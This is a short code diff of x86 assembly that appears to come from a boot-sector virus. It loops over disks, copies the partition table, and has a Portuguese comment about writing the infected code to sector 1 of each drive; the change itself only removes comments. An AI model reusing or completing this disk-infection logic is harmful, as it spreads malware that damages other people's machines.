@@ -38,9 +38,9 @@ loop_over_disks:
 
         jc next ; Carry = 1 - Disco não existe
         
-        mov si, part_table + 0x200    ; source address 0x7e00 + part_table
-        mov di, part_table            ; dest address 0x7c00 + part_table
-        mov cx, 74                    ; its size it 74 bytes
+        mov si, part_table + 0x200
+        mov di, part_table
+        mov cx, 74
         rep movsb
         
         ; Escrevemos o codigo infectado no DL (Driver) definido (iteração) Sector 1
